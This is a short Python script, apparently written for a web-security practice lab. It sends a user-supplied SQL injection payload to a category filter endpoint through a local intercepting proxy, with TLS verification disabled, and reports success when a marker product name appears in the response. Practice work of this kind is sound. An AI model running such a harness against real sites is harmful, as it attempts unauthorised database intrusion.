import requests
import sys
import urllib3
from urllib.parse import urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

headers = {
    'User-Agent': 'Mozilla/5.0'
}

def sqli(base_url, payload):
    uri = "/filter?category="
    target_url = urljoin(base_url.rstrip('/'), uri + payload)
    try:
        response = requests.get(target_url, headers=headers, verify=False, proxies=proxies)
        response.raise_for_status()
        return "The Lazy Dog" in response.text
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        return False


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 script.py <URL> <payload>")
        sys.exit(1)

    url = sys.argv[1].strip()
    payload = sys.argv[2].strip()

    if sqli(url, payload):
        print("SQL injection successful!")
    else:
        print("SQL injection unsuccessful.")